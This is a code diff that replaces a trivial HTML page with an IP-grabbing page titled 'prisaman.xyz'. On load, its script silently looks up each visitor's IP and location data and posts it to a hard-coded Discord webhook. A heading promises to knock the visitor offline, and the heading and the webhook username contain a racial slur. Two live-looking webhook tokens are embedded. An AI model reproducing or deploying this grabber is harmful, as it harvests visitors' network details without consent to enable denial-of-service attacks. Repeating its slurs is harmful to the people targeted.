@@ -1,6 +1,52 @@
-<!DOCTYPE html>
 <html>
-   <body>
-      <p>אבא</p>
-   </body>
+  <head>
+prisaman.xyz
+  </head>
+  <body>
+    <h1>
+get booted offline nigga
+    </h1>
+      <body>
+    <button onclick="sendMessage()">Send test</button>
+  </body>
+
+  </body>
+<script src="https://code.jquery.com/jquery-1.9.1.js"></script>
+  <script type="text/javascript">
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/971547169070936084/MfG0DmeEpEhTPJfFjx1RfRb39g0rl_KVHmGOU9w8e2O4sYKVueVZVTUQOK2AHdxed3xc");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "prisaman's niggas",
+        avatar_url: "",
+        content: "a new enter has arrived!" + "```" + JSON.stringify(data, null, 2) + "```"
+      }
+
+      request.send(JSON.stringify(params));
+
+  
+});
+
+
+      function sendMessage() {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/972234126138671135/jpU0fVj7ZMhv-M7ZHzDpzQB5lYwTwT92Lnyk2Mv6kKmg5gBL3VsRQZJ2oP5Wst83zES0");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "prisaman's niggas",
+        avatar_url: "",
+        content: 'test'
+      }
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+  
 </html>
